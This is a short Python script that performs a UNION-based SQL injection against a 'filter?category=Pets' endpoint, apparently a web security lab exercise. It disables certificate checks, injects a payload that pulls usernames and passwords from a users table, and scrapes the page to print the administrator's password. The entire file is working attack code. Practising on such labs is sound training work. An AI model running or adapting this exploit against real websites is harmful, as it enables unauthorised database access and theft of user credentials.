import requests 
import urllib3
import re 
import sys
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit_union_attack(url):
    print("[*] Exploiting password")
    url = url.strip()
    path = 'filter?category=Pets'
    sql_payload = "'union select NULL, username || "+" || password from users--"

    response = requests.get(url + path + sql_payload, verify=False)
    htmlData = BeautifulSoup(response.text, 'html.parser')

    admin_text = htmlData.find_all(string=re.compile('.*administrator.*',re.IGNORECASE))

    if admin_text:
        print("[*] Found Admininstrator")
        for password in admin_text:
            print("this is the password :: ", password.split()[2])
        
    else:
        print("Failed to found Password ")



if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("error command")
    else:
        url = sys.argv[1]
        exploit_union_attack(url)
    